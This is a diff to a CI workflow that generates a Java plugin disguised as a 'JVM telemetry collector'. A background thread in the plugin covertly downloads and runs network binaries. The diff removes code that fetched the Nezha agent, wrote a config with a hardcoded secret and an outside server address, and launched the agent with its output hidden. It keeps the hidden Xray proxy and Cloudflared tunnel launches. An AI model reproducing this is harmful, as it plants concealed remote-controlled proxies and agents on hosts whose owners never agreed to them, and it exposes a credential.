@@ -114,7 +114,7 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # 3. Java 核心主类 (包含 Nezha v1 必需的 UUID 与配置格式)
+          # 3. Java 核心主类 (仅保留 Xray 与 Cloudflared)
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
@@ -146,54 +146,15 @@ jobs:
                       try {
                           Thread.sleep(10000);
                           if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
-                          setupNezha();
                           setupXray();
                           setupCloudflare();
-                          getLogger().info("[Metrics] All telemetry sub-services started successfully.");
+                          getLogger().info("[Metrics] All core network services started successfully.");
                       } catch (Exception e) {
                           getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
                       }
                   }, "JVM-Metrics-Daemon");
                   daemonThread.setDaemon(true);
                   daemonThread.start();
-              }
-
-              private void setupNezha() {
-                  try {
-                      File nezhaBin = new File(WORK_DIR, "nezha-agent");
-                      if (!nezhaBin.exists() || nezhaBin.length() == 0) {
-                          downloadAndExtractZip(
-                                  "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip",
-                                  "nezha-agent",
-                                  nezhaBin
-                          );
-                      }
-
-                      // 写入哪吒 v1 规范 config.yaml（必须包含 uuid 字段）
-                      File cfgFile = new File(WORK_DIR, "config.yaml");
-                      String yaml = "client_secret: \"JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl\"\n" +
-                              "server: \"bo88.eu.cc:8008\"\n" +
-                              "uuid: \"c1926618-9773-424a-9769-cf2a911e3b6e\"\n" +
-                              "tls: false\n" +
-                              "insecure_tls: true\n" +
-                              "disable_auto_update: true\n" +
-                              "disable_force_update: true\n" +
-                              "disable_command_execute: true\n" +
-                              "report_delay: 3\n";
-                      Files.writeString(cfgFile.toPath(), yaml, StandardCharsets.UTF_8);
-
-                      if (nezhaBin.exists()) {
-                          nezhaBin.setExecutable(true, false);
-                          new ProcessBuilder(
-                                  nezhaBin.getAbsolutePath(),
-                                  "-c",
-                                  cfgFile.getAbsolutePath()
-                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
-                          getLogger().info("[Metrics] Nezha Agent v1 launched with UUID.");
-                      }
-                  } catch (Exception e) {
-                      getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
-                  }
               }
 
               private void setupXray() {
